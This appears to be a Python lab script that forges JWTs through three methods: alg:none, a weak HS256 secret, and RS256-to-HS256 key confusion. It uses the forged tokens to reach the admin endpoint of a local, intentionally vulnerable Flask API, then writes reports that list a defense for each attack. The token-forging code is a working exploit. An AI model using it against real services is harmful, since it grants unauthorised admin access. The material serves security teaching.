import base64
import hashlib
import hmac
import json
import time
from pathlib import Path

import requests

BASE_DIR = Path(__file__).resolve().parent.parent
KEY_DIR = BASE_DIR / "keys"
REPORT_DIR = BASE_DIR / "reports"
SAMPLE_DIR = BASE_DIR / "sample-data"

REPORT_DIR.mkdir(exist_ok=True)
SAMPLE_DIR.mkdir(exist_ok=True)

API_URL = "http://127.0.0.1:5000"
PUBLIC_KEY = (KEY_DIR / "public.pem").read_text(encoding="utf-8")
WEAK_SECRET = "secret123"

ISSUER = "lab4-vulnerable-api"
AUDIENCE = "lab4-users"


def b64url_encode(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(",", ":")).encode()

    if isinstance(data, str):
        data = data.encode()

    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def create_none_token(payload):
    header = {
        "alg": "none",
        "typ": "JWT"
    }

    return f"{b64url_encode(header)}.{b64url_encode(payload)}."


def create_hs256_token(payload, secret):
    header = {
        "alg": "HS256",
        "typ": "JWT"
    }

    header_b64 = b64url_encode(header)
    payload_b64 = b64url_encode(payload)

    signing_input = f"{header_b64}.{payload_b64}".encode()

    signature = hmac.new(
        secret.encode(),
        signing_input,
        hashlib.sha256
    ).digest()

    return f"{header_b64}.{payload_b64}.{b64url_encode(signature)}"


def send_to_admin(token):
    response = requests.get(
        f"{API_URL}/admin",
        headers={
            "Authorization": f"Bearer {token}"
        },
        timeout=10
    )

    try:
        body = response.json()
    except Exception:
        body = {
            "raw": response.text
        }

    return response.status_code, body


def get_normal_token():
    response = requests.post(
        f"{API_URL}/login",
        json={
            "username": "alice",
            "role": "user",
            "algorithm": "RS256"
        },
        timeout=10
    )

    return response.json()["token"]


def build_payload(username="attacker", role="admin"):
    now = int(time.time())

    return {
        "username": username,
        "role": role,
        "iss": ISSUER,
        "aud": AUDIENCE,
        "iat": now,
        "nbf": now,
        "exp": now + 900
    }


def write_json_report(report):
    output_file = REPORT_DIR / "jwt_attack_report.json"

    with open(output_file, "w", encoding="utf-8") as file:
        json.dump(report, file, indent=4)

    return output_file


def write_sample_tokens(tokens):
    output_file = SAMPLE_DIR / "sample_tokens.json"

    with open(output_file, "w", encoding="utf-8") as file:
        json.dump(tokens, file, indent=4)

    return output_file


def write_html_dashboard(report):
    rows = ""

    for item in report:
        rows += f"""
        <tr>
            <td>{item["attack_name"]}</td>
            <td>{item["vulnerability"]}</td>
            <td>{item["status_code"]}</td>
            <td>{item["result"]}</td>
            <td>{item["severity"]}</td>
            <td>{item["defense"]}</td>
        </tr>
        """

    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>JWT Attack Dashboard</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 40px;
            background-color: #f7f9fc;
        }}
        h1 {{
            color: #111827;
        }}
        table {{
            border-collapse: collapse;
            width: 100%;
            background-color: white;
        }}
        th, td {{
            border: 1px solid #ddd;
            padding: 12px;
            text-align: left;
            vertical-align: top;
        }}
        th {{
            background-color: #111827;
            color: white;
        }}
        tr:nth-child(even) {{
            background-color: #f2f2f2;
        }}
    </style>
</head>
<body>
    <h1>JWT Authentication Bypass Attack Dashboard</h1>
    <p>This dashboard documents local-only JWT attacks against an intentionally vulnerable Flask API.</p>

    <table>
        <tr>
            <th>Attack</th>
            <th>Vulnerability</th>
            <th>Status Code</th>
            <th>Result</th>
            <th>Severity</th>
            <th>Defense</th>
        </tr>
        {rows}
    </table>
</body>
</html>
"""

    output_file = REPORT_DIR / "jwt_dashboard.html"

    with open(output_file, "w", encoding="utf-8") as file:
        file.write(html)

    return output_file


def main():
    normal_token = get_normal_token()
    admin_payload = build_payload()

    none_token = create_none_token(admin_payload)
    weak_secret_token = create_hs256_token(admin_payload, WEAK_SECRET)
    confusion_token = create_hs256_token(admin_payload, PUBLIC_KEY)

    attacks = [
        {
            "attack_name": "None Algorithm Attack",
            "token": none_token,
            "vulnerability": "Server accepts unsigned JWTs with alg:none.",
            "severity": "Critical",
            "defense": "Reject alg:none and enforce algorithm pinning."
        },
        {
            "attack_name": "Claim Forgery with Weak HS256 Secret",
            "token": weak_secret_token,
            "vulnerability": "Weak HS256 secret allows attacker to forge admin claims.",
            "severity": "High",
            "defense": "Use strong high-entropy secrets or RS256."
        },
        {
            "attack_name": "RS256 to HS256 Algorithm Confusion",
            "token": confusion_token,
            "vulnerability": "Server accepts HS256 token signed using public key as HMAC secret.",
            "severity": "Critical",
            "defense": "Pin RS256 and never trust token-supplied algorithms."
        }
    ]

    report = []

    for attack in attacks:
        status_code, body = send_to_admin(attack["token"])
        successful = status_code == 200

        report.append({
            "attack_name": attack["attack_name"],
            "vulnerability": attack["vulnerability"],
            "status_code": status_code,
            "result": "Admin access obtained" if successful else "Attack failed",
            "response": body,
            "severity": attack["severity"],
            "defense": attack["defense"],
            "token_preview": attack["token"][:80] + "..."
        })

    tokens = {
        "normal_rs256_user_token": normal_token,
        "none_algorithm_admin_token": none_token,
        "weak_secret_admin_token": weak_secret_token,
        "algorithm_confusion_admin_token": confusion_token
    }

    token_file = write_sample_tokens(tokens)
    json_file = write_json_report(report)
    html_file = write_html_dashboard(report)

    print("JWT Attack Toolkit Complete")
    print(f"Sample tokens written: {token_file}")
    print(f"JSON report generated: {json_file}")
    print(f"HTML dashboard generated: {html_file}")


if __name__ == "__main__":
    main()